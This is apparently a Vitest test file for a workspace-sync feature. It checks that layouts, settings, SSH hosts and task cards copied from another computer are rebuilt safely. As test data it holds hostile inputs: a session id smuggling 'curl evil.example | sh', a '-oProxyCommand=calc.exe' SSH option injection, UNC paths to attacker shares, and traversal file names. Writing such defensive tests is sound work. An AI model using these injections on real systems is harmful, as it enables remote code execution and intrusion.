// @vitest-environment node
// What a copy of a setup may hold: rebuilt field by field, on the computer that sends and, refusing
// anything out of shape, on the one that receives. What a hostile copy tries is here by name.
import { describe, it, expect } from 'vitest'
import { readFileSync } from 'node:fs'
import { join } from 'node:path'
import { MAX_SYNC_DEPTH, MAX_SYNC_PANES, SYNCED_SETTINGS, finishBoard, finishHosts, finishLayout, hostChangesOf, localFolderOk, localizeRebuilt, pickSettings, rebuildBoard, rebuildHosts, rebuildLayout, rebuildReceived, restoreShadow, shapeOf, shrunkFrom, summaryOf } from '../syncSchema'
import { SENSITIVE_SETTINGS } from '../settingsBackup'
import { chosenRootsOfLayout, localRootsOfLayout } from '../worktreeList'
import { DEFAULT_SETTINGS } from '../../renderer/src/settings'

const strict = { strict: true }
const agent = (over = {}) => ({ type: 'leaf', kind: 'agent', id: 'pane-a', agentId: 'claude', shellId: 'powershell', sessionId: 'abcdef-123456', ...over })
const project = (tree, over = {}) => ({ id: 'ws-1', name: 'Project', cwd: 'C:/p', tree, ...over })
const layout = (tree, over = {}) => ({ version: 2, settings: {}, workspaces: [project(tree)], ...over })
const nest = (leaf, levels) => {
  let node = leaf
  for (let i = 0; i < levels; i++) node = { type: 'split', dir: 'row', sizes: [100], children: [node] }
  return node
}
const refused = (value) => expect(() => rebuildLayout(value, strict)).toThrow(expect.objectContaining({ code: 'refused' }))
const panes = (body) => {
  const out = []
  const walk = (n) => {
    if (!n) return
    if (n.type === 'leaf') out.push(n)
    else n.children.forEach(walk)
  }
  body.workspaces.forEach((w) => walk(w.tree))
  return out
}

describe('C1: a copy refused whole', () => {
  it.each([
    ['a command that is not text', layout(agent({ agentCommand: ['calc.exe'] }))],
    ['a command that is an object', layout(agent({ agentCommand: { toString: 'calc.exe' } }))],
    ['the older format: a tree at the top', { version: 1, settings: {}, tree: agent({ agentCommand: 'calc.exe' }) }],
    ['the older format beside a list', layout(null, { tree: agent() })],
    ['a conversation id with a command in it', layout(agent({ sessionId: 'x; calc.exe #' }))],
    ['a conversation id that goes to a host', layout(agent({ remoteHostId: 'ssh-abc', sessionId: 'x; curl evil.example | sh #' }))],
    ['a conversation id that is a number', layout(agent({ sessionId: 123456789 }))],
    ['a pane id the window refuses', layout(agent({ id: 'not a pane id' }))],
    ['a pane id that is not text', layout(agent({ id: ['pane-1'] }))],
    ['an agent id with a path in it', layout(agent({ agentId: '..\\..\\calc' }))],
    ['a kind nobody knows', layout(agent({ kind: 'daemon' }))],
    ['a title that is not text', layout(agent({ title: { a: 1 } }))],
    ['a name that is not text', { version: 2, workspaces: [project(null, { name: 7 })] }],
    ['a folder that is not text', { version: 2, workspaces: [project(null, { cwd: ['C:/x'] })] }],
    ['a project id the window refuses', { version: 2, workspaces: [project(null, { id: 'nope' })] }],
    ['the same pane twice', layout({ type: 'split', dir: 'row', sizes: [50, 50], children: [agent(), agent()] })],
    ['the same project twice', { version: 2, workspaces: [project(null), project(null)] }],
    ['a list of projects that is not one', { version: 2, workspaces: 'x' }],
    ['no list of projects', { version: 2, settings: {} }],
    ['settings that are not an object', { version: 2, settings: [], workspaces: [] }],
    ['a split with no children', layout({ type: 'split', dir: 'row', sizes: [] })],
    ['a split with a direction nobody knows', layout({ type: 'split', dir: 'x', sizes: [50, 50], children: [agent(), agent({ id: 'pane-b' })] })],
    ['a worktree that is not one', layout(agent({ worktree: 'C:/x' }))],
    ['a host id the window refuses', layout(agent({ remoteHostId: '-oProxyCommand=calc.exe' }))],
    ['control characters in a name', layout(agent({ paneName: 'a\u0007b' }))]
  ])('%s', (_what, value) => refused(value))

  it('too deep: refused, not skipped', () => {
    expect(() => rebuildLayout(layout(nest(agent(), MAX_SYNC_DEPTH)), strict)).not.toThrow()
    for (const levels of [MAX_SYNC_DEPTH + 1, 30, 61, 200]) refused(layout(nest(agent({ permissions: 'yolo' }), levels)))
  })

  it('M7: too many panes: refused; the limit itself goes through', () => {
    const many = (count) => ({ type: 'split', dir: 'row', sizes: Array(count).fill(1), children: Array.from({ length: count }, (_, i) => ({ type: 'leaf', kind: 'shell', id: `pane-${i}` })) })
    expect(() => rebuildLayout(layout(many(MAX_SYNC_PANES)), strict)).not.toThrow()
    refused(layout(many(MAX_SYNC_PANES + 1)))
    // Across projects too.
    const half = many(MAX_SYNC_PANES)
    const other = { type: 'split', dir: 'row', sizes: [1, 1], children: [{ type: 'leaf', kind: 'shell', id: 'pane-x' }, { type: 'leaf', kind: 'shell', id: 'pane-y' }] }
    refused({ version: 2, workspaces: [project(half), project(other, { id: 'ws-2' })] })
  })

  it('a valid copy goes through, and the sender\u2019s rebuild is what the receiver gets, unchanged', () => {
    const sent = rebuildLayout(layout(agent({ permissions: 'yolo', agentCommand: 'claude', launchSig: 'x', title: 'Claude', titleSet: true })))
    expect(rebuildLayout(sent, strict)).toEqual(sent)
    expect(JSON.stringify(rebuildLayout(sent, strict))).toBe(JSON.stringify(sent))
  })

  it('the sender never refuses its own file: it leaves out what is not valid', () => {
    const sent = rebuildLayout(layout(agent({ agentCommand: ['calc.exe'], sessionId: 'x; calc.exe #' }), { tree: agent() }))
    expect(panes(sent)[0]).toEqual({ type: 'leaf', id: 'pane-a', kind: 'agent', shellId: 'powershell', agentId: 'claude' })
  })
})

describe('what a pane holds in a copy', () => {
  it('never its command, what it may do, or what is this computer\u2019s', () => {
    const [pane] = panes(rebuildLayout(layout(agent({
      agentCommand: 'calc.exe', permissions: 'yolo', permissionMode: 'bypassPermissions', launchYolo: true, rootNoYolo: true, launchSig: 'env=SECRET', accountId: 'acc', hostAccount: 'h',
      lastModel: { id: 'x' }, launchedAt: 1, teamTools: true, toolsVersion: 'v', team: 'team-1', broadcast: true, startDir: 'C:/x', sessionOptions: { model: 'x' }, sleeping: { at: 1 }, agentMissing: true, autoTitle: 'x', chatView: true
    }))))
    expect(pane).toEqual({ type: 'leaf', id: 'pane-a', kind: 'agent', shellId: 'powershell', agentId: 'claude', sessionId: 'abcdef-123456' })
  })

  it('H7: a browser pane keeps its place, never its page or its title', () => {
    const [pane] = panes(rebuildLayout(layout({ type: 'leaf', kind: 'browser', id: 'pane-b', url: 'https://app.example/callback?token=SECRET', title: 'SECRET title', agentSession: true, guestSession: true, zoom: 2 })))
    expect(pane).toEqual({ type: 'leaf', id: 'pane-b', kind: 'browser' })
    expect(JSON.stringify(rebuildLayout(layout(agent({ title: 'a title a page chose' }))))).not.toContain('a page chose')
  })

  it('a name the person gave a pane travels; what a program calls itself does not', () => {
    expect(panes(rebuildLayout(layout(agent({ title: 'Mine', titleSet: true }))))[0]).toMatchObject({ title: 'Mine', titleSet: true })
    expect(panes(rebuildLayout(layout(agent({ title: 'From the terminal' }))))[0].title).toBeUndefined()
  })

  it('M8: a key in a custom command never leaves', () => {
    const text = JSON.stringify(rebuildLayout(layout(agent({ agentCommand: 'aider --api-key sk-CUSTOM-SECRET' }))))
    expect(text).not.toContain('sk-CUSTOM-SECRET')
  })
})

describe('M1: settings are an allowlist', () => {
  it('nothing that decides what agents may do is on the list', () => {
    for (const key of SENSITIVE_SETTINGS) expect(SYNCED_SETTINGS).not.toHaveProperty(key)
  })

  it.each([
    'autoUpdateAgents', 'projectOpen', 'restoreWorkspaces', 'resumeAgents', 'confirmMultilinePaste', 'confirmCloseAgent', 'confirmQuitRunning', 'confirmDeleteWorkspace', 'notificationsEnabled', 'desktopNotifications',
    'inAppAlerts', 'notifyTerminalBell', 'notificationVolume', 'alertSound', 'rightClickPaste', 'copyOnSelect', 'defaultAgent', 'agentSessionOptions', 'hostAccountDefaults', 'linksOpenUrlsIn', 'teamWakeUps', 'agentTerminalBackground',
    'chatIdleMinutes', 'keepAwake', 'agentSleep', 'agentSleepMinutes', 'liveShareHostCommands', 'editorAutoSave', 'branchPrefix', 'branchPrefixCustom', 'voiceTip', 'workspaceDir', 'gpuAcceleration', 'cookiesImportedOnce',
    'contextClaudeSignIn', 'contextGeminiSignIn', 'compactDefaults', 'sidebarShownWorktrees', 'sidebarFilterRepoIds'
  ])('%s stays what this computer has', (key) => {
    expect(SYNCED_SETTINGS).not.toHaveProperty(key)
    expect(pickSettings({ [key]: 'any' })).toEqual({})
  })

  it('every setting on the list is a real one, and its default passes its own check', () => {
    for (const key of Object.keys(SYNCED_SETTINGS)) {
      expect(DEFAULT_SETTINGS, key).toHaveProperty(key)
      expect(SYNCED_SETTINGS[key](DEFAULT_SETTINGS[key]), key).toBe(true)
    }
  })

  it('a setting that is new is not on the list until someone adds it', () => {
    expect(pickSettings({ somethingAddedNextYear: true, theme: 'dark' })).toEqual({ theme: 'dark' })
  })

  it.each([
    ['fontFamily', 'Evil"; }'],
    ['fontSize', 500],
    ['fontSize', '14'],
    ['inactivePaneOpacity', 0],
    ['uiZoomLevel', 99],
    ['cursorStyle', 'evil'],
    ['theme', ['x']]
  ])('a value out of shape is dropped: %s', (key, value) => {
    expect(pickSettings({ [key]: value })).toEqual({})
  })
})

describe('H2 and M6: folders', () => {
  it.each(['C:\\Users\\me\\p', 'C:/Users/me/p', 'Z:\\mapped', '/home/me/p'])('%s can be looked at', (p) => expect(localFolderOk(p)).toBe(true))
  it.each(['\\\\evil\\share', '//evil/share', '/\\evil\\share', '\\/evil/share', '\\\\?\\UNC\\evil\\share', '\\\\.\\C:\\x', '\\??\\UNC\\evil\\share', ' \\\\evil\\share', 'C:relative', 'relative', '', null, 7, 'C:\\a\u0007b', `C:\\${'a'.repeat(2000)}`, 'file:///etc', 'ssh://host/x'])('%s is refused', (p) => expect(localFolderOk(p)).toBe(false))

  const finished = (current) => JSON.parse(finishLayout(JSON.stringify({ version: 2, settings: {}, workspaces: [{ id: 'ws-1', cwd: 'C:/from-copy', tree: null }, { id: 'ws-2', cwd: 'C:/mine', tree: null }, { id: 'ws-3', cwd: null, tree: null }] }), current ? JSON.stringify(current) : null))

  it('a folder that only the copy names is never a folder the person chose', () => {
    const out = finished({ workspaces: [{ id: 'ws-9', cwd: 'c:\\MINE\\', tree: null }] })
    expect(out.workspaces.map((w) => w.fromCopy)).toEqual([true, undefined, undefined])
    expect(chosenRootsOfLayout(out)).toHaveLength(1)
    expect(chosenRootsOfLayout(out)[0].toLowerCase()).toContain('mine')
    expect(localRootsOfLayout(out)).toHaveLength(2)
  })

  it('on a fresh computer, none of them', () => {
    expect(chosenRootsOfLayout(finished(null))).toEqual([])
  })

  it('a mark stays: applying again does not turn it into a choice', () => {
    const once = finished(null)
    expect(chosenRootsOfLayout(finished(once))).toEqual([])
  })

  it('a copy that says it is not from a copy changes nothing: the mark is not read from it', () => {
    const sent = rebuildLayout({ version: 2, workspaces: [{ id: 'ws-1', cwd: 'C:/x', fromCopy: false, tree: null }] }, strict)
    expect(sent.workspaces[0]).not.toHaveProperty('fromCopy')
  })
})

describe('H6: hosts', () => {
  const mine = { version: 1, targets: [
    { id: 'ssh-1', label: 'prod', configHost: 'prod.corp', host: 'prod.corp', port: 22, username: 'me', source: 'manual', proxyCommand: 'ssh -W %h:%p bastion.corp', jumpHost: 'j.corp', identityFile: 'C:\\keys\\mine' },
    { id: 'ssh-only-here', label: 'only here', configHost: 'only.corp', host: 'only.corp', port: 22, username: '', source: 'manual' }
  ], removed: [{ configHost: 'gone' }] }
  const copy = (over = {}) => JSON.stringify(rebuildHosts({ version: 1, targets: [{ id: 'ssh-1', label: 'renamed', host: 'prod.corp', port: 22, username: 'me', source: 'manual', ...over }] }, strict))

  it('never takes a proxy command, a jump host or a key file from a copy', () => {
    const [target] = rebuildHosts({ targets: [{ id: 'ssh-1', label: 'x', host: 'attacker.example', proxyCommand: 'calc.exe', jumpHost: 'x@evil.example:22', identityFile: '\\\\evil.example\\share\\key' }] }, strict).targets
    expect(Object.keys(target).sort()).toEqual(['configHost', 'host', 'id', 'label', 'port', 'source', 'username'])
  })

  it('a host keeps its proxy command, jump host and key file, and its label follows', () => {
    const [own] = JSON.parse(finishHosts(copy(), JSON.stringify(mine))).targets
    expect(own).toMatchObject({ label: 'renamed', proxyCommand: 'ssh -W %h:%p bastion.corp', jumpHost: 'j.corp', identityFile: 'C:\\keys\\mine' })
  })

  it('a host only on this computer stays, and what it knows of removed hosts', () => {
    const out = JSON.parse(finishHosts(copy(), JSON.stringify(mine)))
    expect(out.targets.map((t) => t.id)).toEqual(['ssh-1', 'ssh-only-here'])
    expect(out.removed).toEqual([{ configHost: 'gone' }])
  })

  it('a changed address is shown, kept as it is here, and taken only on the person\u2019s word', () => {
    const body = copy({ host: 'attacker.example', username: 'root' })
    expect(hostChangesOf(body, JSON.stringify(mine))).toEqual([{ id: 'ssh-1', label: 'prod', from: 'me@prod.corp', to: 'root@attacker.example' }])
    const kept = JSON.parse(finishHosts(body, JSON.stringify(mine))).targets[0]
    expect(kept).toMatchObject({ host: 'prod.corp', username: 'me', label: 'renamed', proxyCommand: 'ssh -W %h:%p bastion.corp' })
    const taken = JSON.parse(finishHosts(body, JSON.stringify(mine), { addresses: 'copy' })).targets[0]
    expect(taken).toMatchObject({ host: 'attacker.example', username: 'root', proxyCommand: 'ssh -W %h:%p bastion.corp' })
    expect(hostChangesOf(copy(), JSON.stringify(mine))).toEqual([])
  })

  it.each([
    ['a host that reads as an option', { id: 'ssh-2', host: '-oProxyCommand=calc.exe' }],
    ['no host', { id: 'ssh-2' }],
    ['no id', { host: 'x.example' }],
    ['not an object', 'x']
  ])('refused whole: %s', (_what, target) => {
    expect(() => rebuildHosts({ targets: [target] }, strict)).toThrow(expect.objectContaining({ code: 'refused' }))
  })
})

describe('M11: the board', () => {
  const copy = (over = {}) => JSON.stringify(rebuildBoard({ tasks: [{ id: 't1', title: 'Do this', column: 'todo', ...over }] }, strict))

  it('a card from a copy never brings a path, a decision or a report', () => {
    const [card] = JSON.parse(copy({ worktree: { path: 'C:/important' }, mergeSha: 'abc', gate: { status: 'pending' }, report: { outcome: 'done' }, guestBy: 'x', copiedFrom: 'x', appliedRequests: ['x'] })).tasks
    expect(Object.keys(card).sort()).toEqual(['column', 'id', 'title'])
  })

  it('words that are new here are marked with the computer they came from', () => {
    expect(JSON.parse(finishBoard(copy(), JSON.stringify({ tasks: [] }), { device: 'OTHER' })).tasks[0].copiedFrom).toBe('OTHER')
    expect(JSON.parse(finishBoard(copy({ title: 'Changed' }), JSON.stringify({ tasks: [{ id: 't1', title: 'Before', column: 'todo' }] }), { device: 'OTHER' })).tasks[0].copiedFrom).toBe('OTHER')
    expect(JSON.parse(finishBoard(copy(), null, {})).tasks[0].copiedFrom).toBe('another computer')
  })

  it('words this computer already has are not marked, and what happened to the card here stays', () => {
    const own = { id: 't1', title: 'Do this', column: 'doing', worktree: { path: 'C:/w' }, report: { outcome: 'x' } }
    const out = JSON.parse(finishBoard(copy(), JSON.stringify({ tasks: [own], history: [{ id: 'h' }], appliedRequests: ['a'], deleted: ['t1', 't2'] }), { device: 'OTHER' }))
    expect(out.tasks[0]).toEqual({ id: 't1', title: 'Do this', column: 'todo', worktree: { path: 'C:/w' }, report: { outcome: 'x' } })
    expect(out).toMatchObject({ history: [{ id: 'h' }], appliedRequests: ['a'], deleted: ['t2'] })
  })

  it('the agents read it: the window says so to team tools, and the tools say so', () => {
    const app = readFileSync(join(__dirname, '../../renderer/src/App.vue'), 'utf8')
    expect(app).toContain('...(t.copiedFrom ? { copied: t.copiedFrom } : {})')
    expect(app).toContain("(task.copiedFrom ? `(This card's words came from a copy of the settings")
    expect(readFileSync(join(__dirname, '../teamTasks.js'), 'utf8')).toContain('guestName(t.copied)')
    expect(readFileSync(join(__dirname, '../teamMcp/server.cjs'), 'utf8')).toContain('its words came from a copy of the settings made on ${t.copied} (not typed here by the user)')
  })

  it.each([
    ['a title that is not text', { title: 5 }],
    ['no title', { title: undefined }],
    ['an id with a path in it', { id: '../x' }],
    ['a column nobody knows', { column: 'x' }],
    ['a pane id the window refuses', { paneId: 'nope' }],
    ['waiting on something that is not a list', { deps: 'x' }]
  ])('refused whole: %s', (_what, over) => {
    expect(() => rebuildBoard({ tasks: [{ id: 't1', title: 'x', column: 'todo', ...over }] }, strict)).toThrow(expect.objectContaining({ code: 'refused' }))
  })

  it('the older shape is only read from this computer\u2019s own file', () => {
    expect(rebuildBoard([{ id: 't1', title: 'x', column: 'todo' }]).tasks).toHaveLength(1)
    expect(() => rebuildBoard([{ id: 't1', title: 'x', column: 'todo' }], strict)).toThrow()
  })
})

describe('a pane this computer has', () => {
  const stage = (pane) => JSON.stringify({ version: 2, settings: { theme: 'dark' }, workspaces: [{ id: 'ws-1', cwd: 'C:/p', tree: pane }] })
  const asleep = { ...agent(), agentCommand: 'claude', sleeping: { at: 5, held: true } }
  const mine = (pane) => JSON.stringify({ version: 2, settings: { agentPermissions: 'yolo' }, broadcast: true, teams: [{ id: 't' }], sideBrowsers: [{ id: 's' }], sidebarWidth: 300, selectedShell: 'pwsh', currentIndex: 3, workspaces: [{ id: 'ws-1', cwd: 'C:/p', tree: pane }] })

  it('keeps what is its own: its account, its pin, how it started', () => {
    const own = agent({ accountId: 'acc', permissions: 'yolo', launchSig: 'x', launchYolo: true, team: 't', broadcast: false, sessionId: 'old-session' })
    const tree = JSON.parse(finishLayout(stage(asleep), mine(own))).workspaces[0].tree
    expect(tree).toMatchObject({ accountId: 'acc', permissions: 'yolo', launchSig: 'x', team: 't', broadcast: false, sessionId: 'abcdef-123456', sleeping: { at: 5, held: true }, agentCommand: 'claude' })
  })

  it('Low: one still running comes back exactly as it is here, Yolo marker included', () => {
    const own = agent({ launchYolo: true, launchSig: 'sig', permissions: 'yolo', agentCommand: 'my-claude', title: 'As it is here', sessionId: 'mine-123456' })
    const tree = JSON.parse(finishLayout(stage(asleep), mine(own), { running: ['pane-a'] })).workspaces[0].tree
    expect(tree).toEqual(own)
  })

  it('a browser pane keeps its own page here', () => {
    const own = { type: 'leaf', kind: 'browser', id: 'pane-b', url: 'https://mine.example/', title: 'Mine' }
    const tree = JSON.parse(finishLayout(stage({ type: 'leaf', kind: 'browser', id: 'pane-b' }), mine(own))).workspaces[0].tree
    expect(tree).toEqual(own)
  })

  it('what is at the top stays this computer\u2019s: teams, broadcast, side browsers, widths', () => {
    const out = JSON.parse(finishLayout(stage(asleep), mine(null)))
    expect(out).toMatchObject({ broadcast: true, teams: [{ id: 't' }], sideBrowsers: [{ id: 's' }], sidebarWidth: 300, selectedShell: 'pwsh', settings: { agentPermissions: 'yolo', theme: 'dark' } })
    expect(out.currentIndex).toBe(0)
  })

  it('a damaged file here only means nothing comes back from it', () => {
    expect(JSON.parse(finishLayout(stage(asleep), '{ nope')).settings).toEqual({ theme: 'dark' })
  })

  it('M1: a copy with teams, broadcast and side browsers brings none of them', () => {
    const sent = rebuildLayout({ version: 2, settings: {}, broadcast: true, teams: [{ channelDir: '\\\\evil\\s' }], sideBrowsers: [{ url: 'https://phish.example/' }], sidePanelTab: 'x', workspaces: [] }, strict)
    expect(Object.keys(sent).sort()).toEqual(['settings', 'version', 'workspaces'])
  })
})

describe('H4: what fits this computer stays out of what it sends', () => {
  const agents = new Map([['claude', { command: 'claude', name: 'Claude Code', available: true }]])
  const copy = () => rebuildLayout({ version: 2, settings: {}, workspaces: [
    { id: 'ws-1', cwd: '\\\\server\\share\\p', group: { repos: [{ path: '\\\\server\\share\\p\\a' }] }, tree: { type: 'split', dir: 'row', sizes: [50, 50], children: [agent({ worktree: { path: 'D:/gone/x', branch: 'x' } }), agent({ id: 'pane-z', agentId: 'not-here' })] } }
  ] }, strict)

  it('sent back, it is the copy it received, not what it made of it', () => {
    const received = copy()
    const { layout: here, shadow } = localizeRebuilt(received, { agents, folderExists: () => false, now: () => 1 })
    expect(panes(here).map((p) => p.kind)).toEqual(['shell', 'shell'])
    // What the window writes back of that: plain terminals, in a project with no folder.
    const written = { version: 2, workspaces: [{ id: 'ws-1', cwd: null, tree: { type: 'split', dir: 'row', sizes: [50, 50], children: panes(here).map((p) => ({ type: 'leaf', id: p.id, kind: 'shell', agentId: null, agentCommand: null, sessionId: null, worktree: null, startDir: 'C:/Users/me' })) } }] }
    const sent = restoreShadow(rebuildLayout(written), shadow)
    expect(JSON.stringify(sent)).toBe(JSON.stringify(received))
  })

  it('unless the person made something else of that pane here', () => {
    const { shadow } = localizeRebuilt(copy(), { agents, folderExists: () => false, now: () => 1 })
    const written = { version: 2, workspaces: [{ id: 'ws-1', cwd: 'C:/chosen', tree: agent({ agentId: 'codex' }) }] }
    const sent = restoreShadow(rebuildLayout(written), shadow)
    expect(sent.workspaces[0].cwd).toBe('C:/chosen')
    expect(sent.workspaces[0].tree.agentId).toBe('codex')
  })

  it('a name the person gives such a pane here is kept', () => {
    const { shadow } = localizeRebuilt(copy(), { agents, folderExists: () => false, now: () => 1 })
    const written = { version: 2, workspaces: [{ id: 'ws-1', cwd: null, tree: { type: 'leaf', id: 'pane-a', kind: 'shell', paneName: 'Renamed' } }] }
    expect(restoreShadow(rebuildLayout(written), shadow).workspaces[0].tree).toMatchObject({ kind: 'agent', agentId: 'claude', paneName: 'Renamed' })
  })
})

describe('H5: what a copy holds, and what an upload would lose', () => {
  const files = (projects, cards = 0, hosts = []) => ({
    'workspace-layout.json': JSON.stringify({ workspaces: projects.map((id) => ({ id, name: id, tree: { type: 'leaf', id: `pane-${id}`, kind: 'agent' } })) }),
    'task-board.json': JSON.stringify({ tasks: Array.from({ length: cards }, (_, i) => ({ id: `t${i}` })) }),
    'remote-hosts.json': JSON.stringify({ targets: hosts.map((id) => ({ id })) })
  })

  it('says what is in it, in numbers', () => {
    expect(summaryOf(files(['ws-a', 'ws-b'], 3, ['h']))).toEqual({ projects: 2, names: ['ws-a', 'ws-b'], panes: 2, agents: 2, hosts: 1, cards: 3 })
  })

  it('a file gone is a loss, whatever the rest', () => {
    const before = shapeOf(files(['ws-a']))
    const { 'task-board.json': gone, ...rest } = files(['ws-a']) // eslint-disable-line no-unused-vars -- what vanished
    expect(shrunkFrom(before, shapeOf(rest))).toEqual({ files: ['task-board.json'] })
  })

  it('the only project replaced by another is a loss: a default grid looks like a whole setup', () => {
    expect(shrunkFrom(shapeOf(files(['ws-real'])), shapeOf(files(['ws-new']))).projects).toEqual({ from: 1, to: 1 })
  })

  it('most projects gone is a loss; one closed out of three is not', () => {
    expect(shrunkFrom(shapeOf(files(['ws-a', 'ws-b', 'ws-c'])), shapeOf(files(['ws-a'])))).toMatchObject({ projects: { from: 3, to: 1 } })
    expect(shrunkFrom(shapeOf(files(['ws-a', 'ws-b', 'ws-c'])), shapeOf(files(['ws-a', 'ws-b'])))).toBeNull()
  })

  it('most hosts, panes or cards gone is a loss; a few are not', () => {
    expect(shrunkFrom(shapeOf(files(['ws-a'], 20)), shapeOf(files(['ws-a'], 2)))).toMatchObject({ cards: { from: 20, to: 2 } })
    expect(shrunkFrom(shapeOf(files(['ws-a'], 20)), shapeOf(files(['ws-a'], 15)))).toBeNull()
    expect(shrunkFrom(shapeOf(files(['ws-a'], 0, ['h1', 'h2', 'h3'])), shapeOf(files(['ws-a'], 0, ['h1'])))).toMatchObject({ hosts: { from: 3, to: 1 } })
    expect(shrunkFrom(shapeOf(files(['ws-a'], 0, ['h1', 'h2'])), shapeOf(files(['ws-a'], 0, ['h1'])))).toBeNull()
  })

  it('with nothing to compare with, nothing to ask', () => {
    expect(shrunkFrom(null, shapeOf(files(['ws-a'])))).toBeNull()
  })
})

describe('what is received, as a whole', () => {
  it('a file that is not JSON, or not text, refuses the copy', () => {
    expect(() => rebuildReceived({ 'workspace-layout.json': '{ nope' })).toThrow(expect.objectContaining({ code: 'refused' }))
    expect(() => rebuildReceived({ 'remote-hosts.json': 5 })).toThrow(expect.objectContaining({ code: 'refused' }))
  })

  it('a name that is not one of the three is simply not there', () => {
    const out = rebuildReceived({ 'git-trust.json': '{"evil":true}', '../evil.json': '{}', 'task-board.json': '{"tasks":[]}' })
    expect(Object.keys(out)).toEqual(['task-board.json'])
  })
})
